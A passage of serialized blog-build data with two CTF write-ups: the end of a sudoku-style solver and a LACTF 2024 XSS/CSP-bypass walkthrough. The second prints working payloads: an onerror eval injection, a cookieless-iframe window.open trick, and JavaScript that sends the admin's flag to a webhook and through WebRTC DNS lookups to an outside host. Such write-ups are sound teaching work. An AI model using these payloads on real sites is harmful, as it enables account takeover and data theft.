class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, n \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [l[x][i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> l\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"    else:        m = create(n - 1)        l = [m[i][: i + 1] + [n] + m[i][i + 2 :] + [m[i][i + 1]] for i in range(n - 2)]        l.append([n] + m[n - 2][1:] + [m[n - 2][0]])        l.append(            [                [                    x                    for x in range(1, n + 1)                    if x not in [l[x][i] for x in range(n - 1)]                ][0]                for i in range(n)            ]        )        return l\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Finally, whenever we get an \u003Ccode>n\u003C/code> from the server, and an \u003Ccode>a\u003C/code> from the server, we can compute the idempotent latin square, then unshuffle it based on the a array.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">p \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> remote(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">HOST\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PORT\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(p.recvuntil(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).rstrip(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).decode())\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(t):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(p.recvuntil(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).rstrip(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).decode())\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">a \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(x) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p.recvuntil(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).rstrip(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).decode().split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">' '\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> create(n)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"n = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">n\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> np.array(arr).T\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i, x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">enumerate\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(a):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr[x\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t[i].tolist()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">mat \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> np.array(arr).T.tolist()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> mat:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">p.sendline(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">' '\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.join(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">str\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(z) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> z \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">p.interactive()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"p = remote(HOST, PORT)t = int(p.recvuntil(b&#x22;\\n&#x22;).rstrip(b&#x27;\\n&#x27;).decode())for _ in range(t):    n = int(p.recvuntil(b&#x22;\\n&#x22;).rstrip(b&#x27;\\n&#x27;).decode())    a = [int(x) for x in p.recvuntil(b&#x22;\\n&#x22;).rstrip(b&#x27;\\n&#x27;).decode().split(&#x27; &#x27;)]    arr = create(n)    print(f&#x22;n = {n}&#x22;)    t = np.array(arr).T    arr = [None for _ in range(n)]    for i, x in enumerate(a):        arr[x-1] = t[i].tolist()    mat = np.array(arr).T.tolist()    for x in mat:        p.sendline(&#x27; &#x27;.join(str(z) for z in x))p.interactive()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Chr>\n\u003Ch2 id=\"flag\">\u003Ca href=\"#flag\">Flag\u003C/a>\u003C/h2>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">nbctf{th1s_1s_whY_y0U_t3s7_tH3_ch3Ck3r_f1r57}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"nbctf{th1s_1s_whY_y0U_t3s7_tH3_ch3Ck3r_f1r57}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>",{"headings":32,"localImagePaths":47,"remoteImagePaths":48,"frontmatter":49,"imagePaths":52},[33,37,41,44],{"depth":34,"slug":35,"text":36},1,"sudoku-revenge--7-solves","sudoku-revenge | 7 solves",{"depth":38,"slug":39,"text":40},2,"description","Description",{"depth":38,"slug":42,"text":43},"solution","Solution",{"depth":38,"slug":45,"text":46},"flag","Flag",[27],[],{"title":14,"date":50,"tags":51},["Date","2023-12-08T00:40:38.000Z"],[17,18,19,20,21,22,23],[27],"NewportBlakeCTF-2023-sudoku-revenge/index.md","lactf-2024-ctf-wiki",{"id":54,"data":56,"body":66,"filePath":67,"assetImports":68,"digest":75,"rendered":76,"legacyId":99},{"title":57,"date":58,"tags":59},"LACTF 2024: ctf-wiki - CSP Bypass via Cookieless Iframe",["Date","2024-03-01T01:58:35.000Z"],[60,61,62,63,64,65,22],"web-security","xss","csp-bypass","flask","iframe","same-origin-policy","# **ctf-wiki | 38 solves**\n\nI am such a huge fan of CTF players that I decided to create a wiki with some of my favorites! Hopefully, none of them hack it. ;D\n\n[ctf-wiki.chall.lac.tf](ctf-wiki.chall.lac.tf)\n\n## **Description**\n\nWe are given a url, an Admin bot link, and the source code for the main page. The website is a Flask application that lets you add a decription of a CTF player. Once we fill in the fields, we get back a note created with a specific UUID that can later be referenced.\n![](./image.png)\n\nLooking at the source code, we see two main endpoints: `/edit`, and `/view`. However if when we are logged in, and we try to visit `/view`, we are instantly redirected to `/edit`. We can see this implemented in the source:\n\n```py\n@app.get(\"/view/\u003Cpid>\")\ndef page(pid):\n    if session.get(\"username\") is not None and session.get(\"password\") is not None:\n        return redirect(\"/edit/{}\".format(pid))\n```\n\nWhich explicitly redirects us to the `edit` endpoint.\n\nLooking around the source code more, we can see where the flag is stored.\n\n```py\n@app.post(\"/flag\")\ndef flag():\n    adminpw = os.environ.get(\"ADMINPW\") or \"admin\"\n    if session.get(\"password\") != adminpw:\n        return redirect(\"/login?error=\" + urllib.parse.quote_plus(\"Not the admin.\"))\n\n    flag = os.environ.get(\"FLAG\") or \"lactf{test-flag}\"\n    return flag, 200\n```\n\nFor this, we need to make a post request to `/flag`, with an account using the correct admin password. Since we have an Admin Bot for this challenge as well, its clear now that we need some sort of XSS to make the admin request this flag for us, and then we can exfiltrate it to a server we control.\n\nAnd looking at the template for `view.html`, we can see exactly where this XSS is:\n\n```html\n\u003Cdiv class=\"ctfer-info\">{{ description | safe }}\u003C/div>\n```\n\nWhich in Jinja2 templates will not sanitize the input placed there, meaning we can put arbitrary HTML and JS in the description.\nFinally, we can see a CSP is enforced on the pages with a valid session.\n\n```py\n@app.after_request\ndef apply_csp(response):\n    if session.get(\"username\") is not None and session.get(\"password\") is not None:\n        response.headers[\n            \"Content-Security-Policy\"\n        ] = \"default-src 'self'; img-src *; font-src https://fonts.gstatic.com https://fonts.googleapis.com; style-src 'self' https://fonts.googleapis.com\"\n    return response\n\n```\n\nThe `default-src=self` will be a fallback for CSP directives that were not specified in this list, so when exfiltrating we will additionally need to take this into consideration.\n\n## **Solution**\n\nThe base idea of the challenge will utilize the fact that if the ctf-wiki page is embedded in an iframe on an attacker controlled page, that frame will not send session cookies. Meaning if we can get the Admin to visit our page, and embed the `/view` endpoint, it will not send the admin session. However, that iframe can create a window using `window.open`, and the window it creates will send the cookies! Additionally since these are the same origin, the payload in `/view` will be able to access the window object of the cookie page, and therefore execute JS!\n\nNow from here we can make the fetch request, but we need to somehow send this to our domain.\n\n### XSS on window with cookies\n\nTo get a simple POC, we can first create a note that creates a new window, then executes some JS inside that window. I also created this helper script to change the payload on my page quickly.\n\n```py\nimport requests\nfrom base64 import b64encode\n\ncookies = {\n    'session': 'eyJwYXNzd29yZCI6IjEyMzQiLCJ1c2VybmFtZSI6ImFoaCJ9.ZdLx0w.E2vT2k0HzBa_iXbhdqHgGiR-oxg',\n}\n\npayload = f\"\"\"\nw = window.open(\"https://ctf-wiki.chall.lac.tf/\");\nw.alert(1);\n\"\"\".strip()\n\ndata = {\n    'id': 'd74c05271ee7f058e376451a59086650',\n    'name': 'asdf',\n    'image': 'asdf',\n    'team': 'asdf',\n    'specialty': 'asdf',\n    'website': 'asdf',\n    'description': f'\u003Cimg src=x onerror=\"eval(atob(\\'{b64encode(payload.encode()).decode()}\\'))\">',\n}\n\nresponse = requests.post(\n    'https://ctf-wiki.chall.lac.tf/edit/d74c05271ee7f058e376451a59086650',\n    cookies=cookies,\n    data=data,\n)\n```\n\nThen we can host the `/view` endpoint for this page on our own domain in an iframe.\n\n```html\n\u003Ciframe\n  id=\"thing\"\n  src=\"https://ctf-wiki.chall.lac.tf/view/d74c05271ee7f058e376451a59086650\"\n>\u003C/iframe>\n```\n\nWhen we visit our site now when logged in on ctf-wiki, (after enabling popups) we can see a page opened and an alert fired.\n![](./image-1.png)\nWhats important is that the alert is on the new page, and additionally, we can see that the new page will be logged in.\n![](./image-3.png)\n\nNow we can try adjusting our payload to make a fetch to `/flag`, and send it to a webhook.\n\n```js\nw = window.open(\"https://ctf-wiki.chall.lac.tf/\");\nw.onload = () => {\n  w.fetch(\"https://ctf-wiki.chall.lac.tf/flag\", { method: \"POST\" })\n    .then((r) => r.text())\n    .then((r) => {\n      fetch(\"https://eo4r52sc1021bl8.m.pipedream.net?flag=\" + btoa(r));\n    });\n};\n```\n\nNote here we are using `w.fetch` to fetch the `/flag` endpoint, but just fetch to send it back to us. This is since the CSP will prevent using `w.fetch` to make a request outside the `https://ctf-wiki.chall.lac.tf/` origin, however the cookieless page does not have that CSP restriction.\n\nFinally, we send this to the Admin Bot, get our callback, and base64 decode to get the flag!\n![](./image-4.png)\n\n---\n\n## Flag\n\n```\nlactf{k4NT_k33P_4lL_my_F4v0r1T3_ctF3RS_S4m3_S1t3}\n```\n\n## Additional Notes\n\nDuring the CTF, I honestly don't know why I didn't try this. I think I accidently tried `w.fetch` when exfiltrating (instead of just fetch), got the `connect-uri` CSP issue, and then just resorted to the option I knew on how to solve that which was using WebRTC.\n\nA reference for that payload is this very well written writeup for SekaiCTF GolfJail which used that same technique.\n[https://blog.antoniusblock.net/posts/golfjail/](https://blog.antoniusblock.net/posts/golfjail/)\n\nYou can send the same request, but modifying the data to the request response, and collect the response in the DNS query.\nThis is the payload script I used during the CTF.\n\n```py\ninnerpayload = \"\"\"\nwindow.onload = () => {\n    fetch('https://ctf-wiki.chall.lac.tf/flag', {method: \"POST\"}).then(r => r.text()).then(r => {\n        pc=new RTCPeerConnection({\"iceServers\":[{\"urls\":[\"stun:\"+r.split(\"\").map(x=>x.charCodeAt(0).toString(16)).join(\"\").substr(0, 62)+\".\"+\"zlamrbukykhbdngfjbuh29ofd2v5k39qo.oast.fun\"]}]});\n        pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));\n    })\n}\n\"\"\".strip()\n\npayload = f\"\"\"\nw = window.open(\"https://ctf-wiki.chall.lac.tf/\");\nw.eval(atob('{b64encode(innerpayload.encode()).decode()}'))\n\"\"\".strip()\n```\n\nAnd you will get a response like this, which afterwards you can hex decode the subdomain to determine the flag!\n![](./image-5.png)\n\nBut yeah there fetch from the cookieless CSPless page is alot more straightforward lol. In the words of the author himself:\n![](./image-6.png)","src/content/blog/LACTF-2024-ctf-wiki/index.md",[69,70,71,72,73,74],"./image.png","./image-1.png","./image-3.png","./image-4.png","./image-5.png","./image-6.png","50dce286aa3bf30c",{"html":77,"metadata":78},"\u003Ch1 id=\"ctf-wiki--38-solves\">\u003Ca href=\"#ctf-wiki--38-solves\">\u003Cstrong>ctf-wiki | 38 solves\u003C/strong>\u003C/a>\u003C/h1>\n\u003Cp>I am such a huge fan of CTF players that I decided to create a wiki with some of my favorites! Hopefully, none of them hack it. ;D\u003C/p>\n\u003Cp>\u003Ca href=\"ctf-wiki.chall.lac.tf\">ctf-wiki.chall.lac.tf\u003C/a>\u003C/p>\n\u003Ch2 id=\"description\">\u003Ca href=\"#description\">\u003Cstrong>Description\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>We are given a url, an Admin bot link, and the source code for the main page. The website is a Flask application that lets you add a decription of a CTF player. Once we fill in the fields, we get back a note created with a specific UUID that can later be referenced.\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>Looking at the source code, we see two main endpoints: \u003Ccode>/edit\u003C/code>, and \u003Ccode>/view\u003C/code>. However if when we are logged in, and we try to visit \u003Ccode>/view\u003C/code>, we are instantly redirected to \u003Ccode>/edit\u003C/code>. We can see this implemented in the source:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.zgx9u.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.p1z7b.js\">\u003C/script>\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0\">@app.get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/view/&#x3C;pid>\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">page\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(pid):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> session.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"username\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">and\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> session.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"password\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> redirect(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/edit/\u003C/span>\u003Cspan style=\"--0:#79B8FF\">{}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.format(pid))\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"@app.get(&#x22;/view/\u003Cpid>&#x22;)def page(pid):    if session.get(&#x22;username&#x22;) is not None and session.get(&#x22;password&#x22;) is not None:        return redirect(&#x22;/edit/{}&#x22;.format(pid))\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Which explicitly redirects us to the \u003Ccode>edit\u003C/code> endpoint.\u003C/p>\n\u003Cp>Looking around the source code more, we can see where the flag is stored.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0\">@app.post\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/flag\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> 